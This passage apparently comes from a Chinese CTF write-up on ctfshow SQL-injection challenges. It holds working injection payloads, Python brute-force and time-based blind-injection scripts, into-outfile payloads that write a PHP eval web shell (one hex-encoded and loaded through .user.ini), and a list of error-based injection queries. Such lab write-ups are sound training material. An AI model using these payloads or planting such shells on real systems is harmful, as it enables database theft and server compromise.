<p>这是一个非常消耗阳寿的脚本，因为我知道列名是flag，所以我设置了index大于等于5时跳出，而且选择的字符非常少，还是花了较长时间。但是如果真实的列名更长的话，那就试着优化一下脚本或者换个方法吧（bp也许快得多？而且脚本有小瑕疵，因为python学的不精，就是list转str那里，如果列名包含replace里面的字符的话就GG)（如果知到列名的组成的话，可以适当减少s的参与递归的数量，我这里直接少了一堆，还是耽误时间。（实战遇到我直接吐）</p>
<p>拿到跑出来的列名之后，在页面可以直接拿到flag值，变成payload如下</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">sql</span>查表名</span><br><span class="line"># banlist,ctfshow_user,flagbb</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查数据</span></span><br><span class="line"><span class="string"># ctfshow&#123;5bcf09a8-3084-4f7a-9011-d586d5fb650b&#125;</span></span><br><span class="line"><span class="string">koishi&#x27;</span>,(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flagbb)));#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h3><p>咱还是用bp吧，自己的脚本优化太垃圾了（线程还是单线程&#x3D;。&#x3D;，不如bp）（用的其他师傅的原图）</p>
<p><strong>抓包</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20211009153227244-347079002.png"
                      alt="img"
                ></p>
<p><strong>设置payload：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20211009153226629-1446255486.png"
                      alt="image-20211009150345481"
                ></p>
<p><strong>开始爆破，同时不断刷新页面，因为返回值解码后都是<code>插入成功</code>，所以没有办法通过<code>length</code>判断flag是否出来</strong></p>
<p><strong>注意：只有正确(数据库中存在)的列名查询出结果后才会添加到列表中，数据没有的列名查不出数据，其结果为空，不会添加到列表中</strong></p>
<p><strong>当跑到这里2000左右的时候出来了flag</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20211009153226087-633437425.png"
                      alt="image-20211009150614540"
                ></p>
<p>可以看到这个师傅在操作的时候，字符也只选了6个（flagbc），要是也是全写完的话估计也得要很长时间，我自己没试。要是真遇到的话，真的耗阳寿。</p>
<h2 id="240（再加上过滤mysql字段）"><a href="#240（再加上过滤mysql字段）" class="headerlink" title="240（再加上过滤mysql字段）"></a>240（再加上过滤mysql字段）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="comment">//过滤空格 or sys mysql</span></span><br></pre></td></tr></table></figure></div>

<p><strong>我真的裂开，上一题好歹还有数据库，好家伙，这回连数据库也给我办了，牛逼。真就阳寿题？</strong></p>
<p>然后发现有个Hint</p>
<blockquote>
<p>Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</p>
</blockquote>
<p><strong>表名爆破就ok，但是咱又咋知道列名，这样咋来判断我们的脚本是否正确，上网找了找，基本上都是有之前的题易得列名是flag，只用猜数据库名&#x3D;。&#x3D;，行吧，比赛遇到直接。。。。得，就这样吧</strong></p>
<p>写个脚本：</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ba8eb13e-9ed6-4e98-ab23-a0e2e710ba64.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line">payloads = [&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;,(select(flag)from(flag<span class="subst">&#123;a&#125;</span>)))#;&quot;</span></span><br><span class="line">&#125;<span class="keyword">for</span> a <span class="keyword">in</span> [<span class="string">f&quot;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span><span class="subst">&#123;c&#125;</span><span class="subst">&#123;d&#125;</span><span class="subst">&#123;e&#125;</span>&quot;</span><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span> <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>]]</span><br><span class="line"><span class="comment"># 这个payload 是参考 b477eRy 师傅写的，这里的生成list的for循环只能说python知识又学到了（我之前完全没学过python，都是凑合着写的）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    response = requests.post(url, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;trying:  <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>回页面刷新就有flag了。</p>
<h1 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h1><h2 id="241"><a href="#241" class="headerlink" title="241"></a>241</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除记录</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from  ctfshow_user where id = <span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>

<p>无过滤的 delete 注入，没有分号数字型注入，布尔盲注记录会越来越少（还没跑完，记录就无了&#x3D;。&#x3D;），用时间盲注。</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://69a92f38-e63f-4686-82b2-5ee60a7ed353.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line"><span class="comment"># 表名 banlist,ctfshow_user,flag</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flag,info</span></span><br><span class="line"><span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">condition = <span class="string">&quot;ascii(mid((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,sleep(0.05),0)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            time_s = time.time()</span><br><span class="line">            _ = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, data=data)</span><br><span class="line">            time_e = time.time()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt;= <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m starting!&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(condition.<span class="built_in">format</span>(payload, index, mid)):</span><br><span class="line">            start = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(end)==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; Success! &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>时间盲注有天生的劣势，如果时间长了跑的不对，就一段一段跑，还有时间上也可以进行修改修改，0.9在本机上跑的非常好</p>
<h1 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h1><h2 id="242"><a href="#242" class="headerlink" title="242"></a>242</h2><p><strong>先看题</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>



<p><a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/1f97795443ce" >sql注入之outfile - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275874.html" >mysql注入之into outfile - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>大致了解了一下 into outfile 这个东东</p>
<p>然后还有查了一下语法常用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]				//设置字符集</span><br><span class="line">        [export_options]							//拓展选项</span><br><span class="line"></span><br><span class="line">export_options:										//具体拓展选项</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br><span class="line">        [ESCAPED BY &#x27;char&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#x27;string&#x27;]</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"></span><br><span class="line">`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br></pre></td></tr></table></figure></div>

<p><strong>利用 export_options 插 shell</strong></p>
<p>（STARTING BY 和 TERMINATED BY 都行 ，只要文件中存在就行）</p>
<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/api/dump.php</span><br><span class="line">filename=koishi.php&#x27;LINES STARTING BY &quot;&lt;?php eval($_POST[koishi]);?&gt;&quot;;#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220829215555881.png"
                      alt="image-20220829215555881"
                ></p>
<p>上传成功后蚁剑连接url&#x2F;dump&#x2F;koishi.php</p>
<p>密码为 koishi</p>
<p>flag在 <code>/flag.here</code></p>
<p>（我在本地上传shell的时候被火绒拦截了，怕在本地留后门，就没关杀毒软件，既然拦截了，就是正确了，懒得试了）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220829220855299.png"
                      alt="image-20220829220855299"
                ></p>
<h2 id="243-多过滤了php，新姿势"><a href="#243-多过滤了php，新姿势" class="headerlink" title="243(多过滤了php，新姿势)"></a>243(多过滤了php，新姿势)</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//备份表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/<span class="subst">&#123;$filename&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//过滤了php</span></span><br></pre></td></tr></table></figure></div>



<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><p>文件内容使用编码绕过就行了，文件后缀使用<code>.user.ini</code></p>
<p>可供参考的资料：<a class="link"   target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-473944.html" >php中.user.ini究竟是个啥神秘东东？-php教程-PHP中文网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>ini 文件中注释 <code>;</code> 开头，这里用 starting by ‘;’ 注释掉原本的内容，后面的字符串前面加个换行就不影响了。（b477eRy师傅还是强啊orz）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span>.user.ini<span class="string">&#x27; lines starting by &#x27;</span>;<span class="string">&#x27; terminated by 0x0a0a6175746f5f70726570656e645f66696c653d736166652e6a70670a6175746f5f617070656e645f66696c653d736166652e6a7067; %23</span></span><br></pre></td></tr></table></figure></div>

<p>16进制原字符串为：</p>
<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">auto_prepend_file</span>=safe.jpg</span><br><span class="line"><span class="attr">auto_append_file</span>=safe.jpg</span><br></pre></td></tr></table></figure></div>

<p>使用这个的目的：参考文章：<a class="link"   target="_blank" rel="noopener" href="https://www.php.cn/php-notebook-179266.html" >PHP中的auto_prepend_file和auto_append_file-php手册-PHP中文网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>就是让ini文件去读取我们的 safe.jpg。</p>
<p> 然后我们只需要再写入我们的jpg就行了</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=safe.jpg<span class="string">&#x27; lines terminated by 0x3c3f706870206576616c28245f504f53545b6b6f697368695d293b203f3e; %23</span></span><br></pre></td></tr></table></figure></div>

<p>这里的16进制字符串原串是：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[koishi]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>之后</p>
<p>蚁剑连接 <code>/dump/</code>，flag 在 <code>/flag.here</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220830095349947.png"
                      alt="image-20220830095349947"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220830095414807.png"
                      alt="image-20220830095414807"
                ></p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/90812612" >(37条消息) sql注入之报错注入_Dar1in9的博客-CSDN博客_报错注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>顺便在其他博客发现了这个好东西（下面的什么select user()  、  version()啥的可以换成其他想要执行的命令）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> floor <span class="operator">+</span> rand <span class="operator">+</span> <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  limit <span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ExtractValue</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> UpdateXml</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Name_Const(<span class="operator">&gt;</span><span class="number">5.0</span><span class="number">.12</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">0</span>),NAME_CONST(version(),<span class="number">0</span>))x;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> <span class="keyword">Join</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> <span class="built_in">exp</span>()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">Exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())a));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> geometrycollection()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> multipoint()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> polygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> multipolygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span> linestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span> multilinestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span 